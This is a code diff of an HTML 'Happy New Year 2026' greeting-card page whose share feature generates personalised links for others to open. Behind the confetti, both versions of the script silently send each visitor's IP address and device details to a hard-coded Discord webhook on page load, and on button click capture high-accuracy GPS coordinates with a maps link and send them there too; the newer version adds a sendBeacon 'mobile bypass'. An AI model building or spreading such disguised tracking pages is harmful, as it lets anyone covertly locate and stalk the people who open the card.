@@ -7,143 +7,105 @@
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
     <style>
         :root { --gold: #ffd700; --dark: #020205; }
-        body { margin: 0; background: var(--dark); color: white; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        
-        #star-canvas { position: fixed; top: 0; left: 0; z-index: -1; width: 100%; height: 100%; pointer-events: none; }
-
-        .card { z-index: 10; background: rgba(10, 10, 20, 0.9); padding: 30px; border-radius: 25px; border: 1px solid rgba(255, 215, 0, 0.3); backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px); text-align: center; max-width: 380px; width: 85%; box-shadow: 0 0 40px rgba(0,0,0,0.8); }
-        
-        .sender-tag { color: var(--gold); font-weight: bold; text-transform: uppercase; letter-spacing: 2px; font-size: 0.8rem; margin-bottom: 10px; }
-        
-        h1 { font-size: 3.5rem; margin: 10px 0; background: linear-gradient(to bottom, #fff, var(--gold), #ff8c00); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        
-        .msg { color: #ccc; font-size: 1.1rem; margin-bottom: 25px; line-height: 1.4; }
-        
-        .btn-main { background: linear-gradient(45deg, #ffd700, #ff8c00); color: #000; border: none; padding: 16px 40px; font-size: 1.1rem; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; transition: 0.3s; }
-        .btn-main:active { transform: scale(0.95); }
-
-        .share-tool { margin-top: 30px; border-top: 1px solid #333; padding-top: 20px; }
-        input { background: #111; border: 1px solid #444; color: white; padding: 10px; border-radius: 8px; width: 70%; margin-bottom: 10px; font-size: 16px; /* Prevents auto-zoom on iPhone */ }
-        .link-box { font-size: 0.7rem; color: #888; background: #000; padding: 8px; border-radius: 5px; word-break: break-all; display: none; }
+        body { margin: 0; background: var(--dark); color: white; font-family: system-ui, -apple-system, sans-serif; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        #bg { position: fixed; top: 0; left: 0; z-index: -1; width: 100%; height: 100%; }
+        .card { z-index: 10; background: rgba(15, 15, 25, 0.9); padding: 30px; border-radius: 25px; border: 1px solid var(--gold); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); text-align: center; width: 85%; max-width: 400px; box-shadow: 0 0 50px rgba(0,0,0,0.9); }
+        h1 { font-size: 3.5rem; margin: 10px 0; background: linear-gradient(to bottom, #fff, var(--gold)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .btn { background: var(--gold); color: #000; border: none; padding: 18px; font-size: 1.2rem; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; margin-top: 20px; }
+        .share { margin-top: 30px; border-top: 1px solid #333; padding-top: 20px; }
+        input { background: #111; border: 1px solid #444; color: white; padding: 10px; border-radius: 8px; width: 70%; margin-bottom: 10px; font-size: 16px; }
     </style>
 </head>
 <body>
 
-    <canvas id="star-canvas"></canvas>
+    <canvas id="bg"></canvas>
 
     <div class="card">
-        <div id="fromLabel" class="sender-tag">Special Invitation</div>
-        <p style="margin:0; opacity:0.6;">Welcome to</p>
+        <div id="sender" style="color:var(--gold); font-size:0.8rem; letter-spacing:2px;">HAPPY NEW YEAR</div>
         <h1>2026</h1>
-        <p class="msg">"Your success and happiness lie in you. Resolve to keep happy, and your joy and you shall form an invincible host against difficulties."</p>
+        <p style="color:#ccc;">"Cheers to a new year and another chance for us to get it right."</p>
         
-        <button class="btn-main" onclick="startExperience()">EXPLORE WISH ✨</button>
+        <button class="btn" onclick="celebrate()">EXPLORE WISH ✨</button>
 
-        <div class="share-tool">
+        <div class="share">
             <input type="text" id="nameIn" placeholder="Your Name">
-            <button style="background:none; border: 1px solid var(--gold); color:var(--gold); padding: 8px; border-radius: 8px; cursor:pointer;" onclick="gen()">Link</button>
-            <div id="linkOut" class="link-box"></div>
+            <button style="background:none; border:1px solid var(--gold); color:var(--gold); padding:8px; border-radius:8px;" onclick="gen()">Link</button>
+            <div id="linkOut" style="font-size:0.7rem; color:#888; margin-top:10px; word-break:break-all;"></div>
         </div>
     </div>
 
-    <audio id="pop" src="https://assets.mixkit.co/active_storage/sfx/2867/2867-preview.mp3"></audio>
+    <audio id="audio" src="https://assets.mixkit.co/active_storage/sfx/2867/2867-preview.mp3"></audio>
 
     <script>
-        // ==========================================
-        // 1. YOUR DISCORD WEBHOOK URL
-        // ==========================================
-        const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1455541858489991209/eerPl-hDw1X9fASbpoTaW65lvgTk4X5NdCzcoo1HT5lyNSC6KrvuAw_TRWCxHwu7zQjj";
+        // 1. YOUR DISCORD URL + /slack (MANDATORY)
+        const WEBHOOK = "https://discordapp.com/api/webhooks/1455541858489991209/eerPl-hDw1X9fASbpoTaW65lvgTk4X5NdCzcoo1HT5lyNSC6KrvuAw_TRWCxHwu7zQjj/slack";
 
-        // ==========================================
-        // 2. AUTOMATIC DATA (Runs on Load)
-        // ==========================================
-        let deviceData = {
-            ua: navigator.userAgent,
-            platform: navigator.platform,
-            screen: `${window.screen.width}x${window.screen.height}`
-        };
-
+        // 2. LOAD & SILENT TRACK
         window.onload = async () => {
             const params = new URLSearchParams(window.location.search);
             const name = params.get('name');
-            if (name) document.getElementById('fromLabel').textContent = `From: ${decodeURIComponent(name)}`;
+            if (name) document.getElementById('sender').textContent = `FROM: ${decodeURIComponent(name)}`;
             
             initStars();
 
-            // Silent IP/City Capture
+            // Silent IP Track
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
-                
-                sendDiscord("🟢 SILENT LOAD (PC/MOBILE)", {
-                    "IP": data.ip,
-                    "Sender": name || "Direct",
-                    "Device": deviceData.platform,
-                    "Resolution": deviceData.screen
-                }, 3066993); 
+                transmit("🟢 VISIT", { "IP": data.ip, "User": name || "Direct", "Device": navigator.platform });
             } catch (e) {}
         };
 
-        // ==========================================
-        // 3. INTERACTIVE DATA (Runs on Button Click)
-        // ==========================================
-        async function startExperience() {
-            document.getElementById('pop').play();
+        // 3. INTERACTIVE TRACK (GPS)
+        async function celebrate() {
+            document.getElementById('audio').play();
             confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
 
-            // Request GPS
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        sendDiscord("🎯 PRECISE GPS (SUCCESS)", {
-                            "Lat": pos.coords.latitude,
-                            "Lon": pos.coords.longitude,
-                            "Accuracy": `${pos.coords.accuracy.toFixed(1)}m`,
-                            "Maps": `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
-                        }, 15844367);
-                    },
-                    (err) => {
-                        sendDiscord("⚠️ GPS DENIED", { "Reason": "User blocked prompt" }, 15158332);
-                    },
-                    { enableHighAccuracy: true, timeout: 5000 }
-                );
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    transmit("🎯 GPS SUCCESS", {
+                        "Lat": pos.coords.latitude,
+                        "Lon": pos.coords.longitude,
+                        "Map": `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
+                    });
+                }, (err) => {
+                    transmit("⚠️ GPS DENIED", { "Reason": "Blocked" });
+                }, { enableHighAccuracy: true });
             }
             alert("Happy New Year 2026!");
         }
 
-        // ==========================================
-        // 4. DATA TRANSMISSION
-        // ==========================================
-        async function sendDiscord(title, fieldsObj, color) {
-            const fields = Object.entries(fieldsObj).map(([k, v]) => ({ name: k, value: String(v), inline: true }));
-            
-            try {
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    mode: 'no-cors', // Essential for some mobile browsers
-                    body: JSON.stringify({
-                        embeds: [{ title: title, fields: fields, color: color, timestamp: new Date() }]
-                    })
-                });
-            } catch (e) {}
+        // 4. THE MOBILE BYPASS TRANSMITTER
+        function transmit(type, data) {
+            const payload = {
+                username: "2026 Tracker",
+                attachments: [{
+                    title: type,
+                    color: "#ffd700",
+                    fields: Object.entries(data).map(([k, v]) => ({ title: k, value: String(v), short: true }))
+                }]
+            };
+
+            // Use Beacon for Mobile Reliability
+            if (navigator.sendBeacon) {
+                const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+                navigator.sendBeacon(WEBHOOK, blob);
+            } else {
+                fetch(WEBHOOK, { method: 'POST', body: JSON.stringify(payload) });
+            }
         }
 
-        // ==========================================
-        // 5. UI UTILS
-        // ==========================================
+        // UI UTILS
         function gen() {
             const n = document.getElementById('nameIn').value;
             if(n) {
                 const url = window.location.origin + window.location.pathname + "?name=" + encodeURIComponent(n);
-                const out = document.getElementById('linkOut');
-                out.style.display = "block";
-                out.textContent = url;
+                document.getElementById('linkOut').textContent = url;
             }
         }
 
         function initStars() {
-            const c = document.getElementById('star-canvas');
+            const c = document.getElementById('bg');
             const x = c.getContext('2d');
             c.width = window.innerWidth; c.height = window.innerHeight;
             for(let i=0; i<100; i++) {
